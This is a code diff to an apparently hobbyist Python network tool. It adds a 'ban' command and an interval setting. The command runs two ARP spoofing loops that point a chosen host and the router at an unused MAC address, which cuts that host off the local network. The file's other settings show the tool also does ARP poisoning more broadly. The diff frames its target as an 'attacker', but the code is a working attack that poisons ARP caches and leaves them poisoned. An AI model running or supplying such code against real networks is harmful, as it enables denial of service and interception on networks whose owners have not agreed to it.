@@ -30,6 +30,7 @@ def main(argc: int, argv: list[str]) -> int:
         commands.global_data["poisoninterval"] = 0.5
         commands.global_data["cleaninterval"] = 2
         commands.global_data["reconnection_interval"] = 2
+        commands.global_data["baninterval"] = 1
         commands.global_data["targetip"] = "192.168.54.42"
         commands.global_data["targetmac"] = "0e:d9:6c:6e:44:62"
         # ⌄ cant define it yet cuz my shitty code relys on the 
@@ -88,6 +89,12 @@ def main(argc: int, argv: list[str]) -> int:
             commands.global_data["reconnection_interval"] = int(value)
         if statement == "get":
             display.print(commands.global_data["reconnection_interval"])
+    @commands.create_command("baninterval")
+    def ban_interval(statement, command, value) -> None:
+        if statement == "set":
+            commands.global_data["baninterval"] = value
+        if statement == "get":
+            display.print(commands.global_data["baninterval"])
 
     @commands.create_command("targetip")
     def target_ip(statement, command, value):
@@ -276,6 +283,40 @@ def main(argc: int, argv: list[str]) -> int:
         display.print(f"device_subnet {device_subnet}")
         display.print(f"target_client_ips {target_client_ips}")
         display.print("All threads running.")
+
+    @commands.create_command("ban")
+    def ban_command(statement, command, value):
+        ip_cache, mac_cache = commands.global_data["broadcast"]
+        unused_mac = net.get_unasigned_mac(mac_list=mac_cache) 
+        # shouldnt be an issue that the unused mac is being used in both the poisons
+        router_ip = net.get_router_ip()
+        router_mac = net.get_mac_from_ip(router_ip, ips_and_macs=(ip_cache, mac_cache))
+        attacker_ip = commands.global_data["targetip"]
+        attacker_mac = commands.global_data["targetmac"]
+        
+        ban_poison_attacker: net.ArpLoop = net.ArpLoop(
+            deviceIp=router_ip, 
+            deviceMac=unused_mac, 
+            sendToIp=attacker_ip, 
+            sendToMac=attacker_mac,
+            interval=commands.global_data["baninterval"]
+            )
+        ban_poison_router: net.ArpLoop = net.ArpLoop(
+            deviceIp=attacker_ip,
+            deviceMac=unused_mac,
+            sendToIp=router_ip,
+            sendToMac=router_mac
+        )
+        
+        if statement == "start":
+            ban_poison_attacker.start()
+            display.print(f"spoof, {router_ip} at {ANSI.ITALIC.value}{unused_mac}{ANSI.END.value}{ANSI.DIM.value} (real '{router_mac}') for '{attacker_ip}' at '{attacker_mac}'")
+            ban_poison_router.start()
+            display.print(f"spoof, {attacker_ip} at {ANSI.ITALIC.value}{unused_mac}{ANSI.END.value}{ANSI.DIM.value} (real '{attacker_mac}') for '{router_ip}' at '{router_mac}'")
+        if statement == "stop":
+            ban_poison_attacker.stop()
+            ban_poison_router.stop()
+            display.print("stopped 2 threads. arp caches have not and will not be cleaned by this script!")
 
     @commands.create_statement("help")
     def help_statement():
